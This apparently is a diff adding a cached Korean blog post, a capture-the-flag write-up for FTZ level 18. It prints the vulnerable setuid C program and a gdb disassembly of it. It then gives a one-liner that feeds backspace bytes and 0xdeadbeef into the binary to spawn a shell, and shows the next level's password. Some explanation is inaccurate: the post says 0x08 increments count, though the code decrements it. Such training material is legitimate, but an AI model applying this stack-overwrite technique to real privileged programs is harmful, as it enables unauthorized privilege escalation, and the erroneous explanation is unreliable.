@@ -1,0 +1,144 @@
+I"�<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login as: level18 
+level18@~~~~~<span class="s1">'s password: 
+[level18@ftz level18]$ ls 
+attackme  hint  public_html  tmp 
+[level18@ftz level18]$ cat hint 
+
+#include &lt;stdio.h&gt;
+#include &lt;sys/time.h&gt; 
+#include &lt;sys/types.h&gt; 
+#include  &lt;unistd.h&gt;
+void shellout(void); 
+int main() 
+{ 
+  char string[100]; 
+  int check; 
+  int x = 0; 
+  int count = 0; 
+  fd_set fds; 
+  printf("Enter your command: "); 
+  fflush(stdout); 
+  while(1) 
+    { 
+      if(count &gt;= 100) 
+        printf("what are you trying to do?\n"); 
+      if(check == 0xdeadbeef) 
+        shellout(); 
+      else 
+        { 
+          FD_ZERO(&amp;fds); 
+          FD_SET(STDIN_FILENO,&amp;fds); 
+
+          if(select(FD_SETSIZE, &amp;fds, NULL, NULL, NULL) &gt;= 1) 
+            { 
+              if(FD_ISSET(fileno(stdin),&amp;fds)) 
+                { 
+                  read(fileno(stdin),&amp;x,1); 
+                  switch(x) 
+                    { 
+                      case '</span><span class="se">\r</span><span class="s1">': 
+                      case '</span><span class="se">\n</span><span class="s1">': 
+                        printf("\a"); 
+                        break; 
+                      case 0x08: 
+                        count--; 
+                        printf("\b \b"); 
+                        break; 
+                      default: 
+                        string[count] = x; 
+                        count++; 
+                        break; 
+                    } 
+                } 
+            } 
+        } 
+    } 
+} 
+
+void shellout(void) 
+{ 
+  setreuid(3099,3099); 
+  execl("/bin/sh","sh",NULL); 
+} 
+
+[level18@ftz level18]$
+</span></code></pre></div></div>
+
+<p>코드가 매우 길다. 솔직히 무슨 프로그램인지 알아내기 위해서는 구글링을 해야 할 것 같다.</p>
+
+<p>그러나 이런 코드를 볼 때에는 어떻게 하면 해킹을 성공할 수 있을지 핵심적인 내용만 파악할 수 있으면 된다.</p>
+
+<p>우선 check가 deadbeef가 되면 /bin/bash를 실행에 해킹에 성공할 수 있다.</p>
+
+<p>한글자씩 입력을 받으며 그 값을 string[count]에 넣어주는 코드이다.</p>
+
+<p>본인은 문제를 풀기 위해 얕게 공부했으므로 자세히 설명해 줄 수 없다.</p>
+
+<p>자세히 알고싶으면 이 사이트를 보는 것이 좋을 것이다.</p>
+
+<p>https://grayfieldbox.tistory.com/entry/FTZFree-Training-Zone-Level-18</p>
+
+<p>이 문제는 OOB의 기법을 사용한다.</p>
+
+<p>https://cw0rldwriteup.tistory.com/20</p>
+
+<p>내가 이전에 정리해 뒀던 OOB의 원리다.</p>
+
+<p>버퍼오버플로우가 익숙하다면 어렵지 않을 것이다.</p>
+
+<p>만약 이해가 되지 않는다면 구글링을 추천한다.</p>
+
+<p>우선 gdb로 분석해보자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level18@ftz level18]<span class="nv">$ </span>gdb <span class="nt">-q</span> attackme 
+<span class="o">(</span>no debugging symbols found<span class="o">)</span>...<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>disassembly-flavor intel 
+<span class="o">(</span>gdb<span class="o">)</span> disas main 
+Dump of assembler code <span class="k">for function </span>main: 
+0x08048550 &lt;main+0&gt;:    push   ebp 
+0x08048551 &lt;main+1&gt;:    mov    ebp,esp 
+0x08048553 &lt;main+3&gt;:    sub    esp,0x100 
+0x08048559 &lt;main+9&gt;:    push   edi 
+0x0804855a &lt;main+10&gt;:   push   esi 
+0x0804855b &lt;main+11&gt;:   push   ebx 
+0x0804855c &lt;main+12&gt;:   mov    DWORD PTR <span class="o">[</span>ebp-108],0x0 
+0x08048563 &lt;main+19&gt;:   mov    DWORD PTR <span class="o">[</span>ebp-112],0x0 
+0x0804856a &lt;main+26&gt;:   push   0x8048800 
+0x0804856f &lt;main+31&gt;:   call   0x8048470  &lt;<span class="nb">printf</span><span class="o">&gt;</span>
+0x08048574 &lt;main+36&gt;:   add    esp,0x4 
+0x08048577 &lt;main+39&gt;:   mov    eax,ds:0x804993c 
+0x0804857c &lt;main+44&gt;:   mov    DWORD PTR <span class="o">[</span>ebp-252],eax 
+0x08048582 &lt;main+50&gt;:   mov    ecx,DWORD PTR <span class="o">[</span>ebp-252] 
+0x08048588 &lt;main+56&gt;:   push   ecx 
+0x08048589 &lt;main+57&gt;:   call   0x8048430  &lt;fflush&gt;
+0x0804858e &lt;main+62&gt;:   add    esp,0x4 
+0x08048591 &lt;main+65&gt;:   jmp    0x8048598 &lt;main+72&gt; 
+0x08048593 &lt;main+67&gt;:   jmp    0x8048775 &lt;main+549&gt; 
+0x08048598 &lt;main+72&gt;:   cmp    DWORD PTR <span class="o">[</span>ebp-112],0x63 
+0x0804859c &lt;main+76&gt;:   jle    0x80485ab &lt;main+91&gt; 
+0x0804859e &lt;main+78&gt;:   push   0x8048815 
+0x080485a3 &lt;main+83&gt;:   call   0x8048470  
+0x080485a8 &lt;main+88&gt;:   add    esp,0x4 
+0x080485ab &lt;main+91&gt;:   cmp    DWORD PTR <span class="o">[</span>ebp-104],0xdeadbeef
+
+........
+</code></pre></div></div>
+
+<p>main+91에서 변수와 deadbeef를 비교하는 것이 보인다.</p>
+
+<p>저것이 check의 주소값일 것이다.</p>
+
+<p>check의 주소값 : ebp-104</p>
+
+<p>C 코드에서 check와 string은 바로 옆에 위치해 있다.</p>
+
+<p>C 프로그램상 0x08을 넣으면 count가 1씩 늘어난다.</p>
+
+<p>그러므로 무작위 대입을 해 보기로 했다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level18@ftz level18]<span class="nv">$ </span><span class="o">(</span>python-c<span class="s1">'print"\x08"*4+"\xef\xbe\xad\xde"'</span><span class="p">;</span><span class="nb">cat</span><span class="o">)</span>|./attackme 
+Enter your <span class="nb">command</span>: my-pass 
+
+Level19 Password is <span class="s2">"swimming in pink"</span><span class="nb">.</span> 
+</code></pre></div></div>
+
+:ET
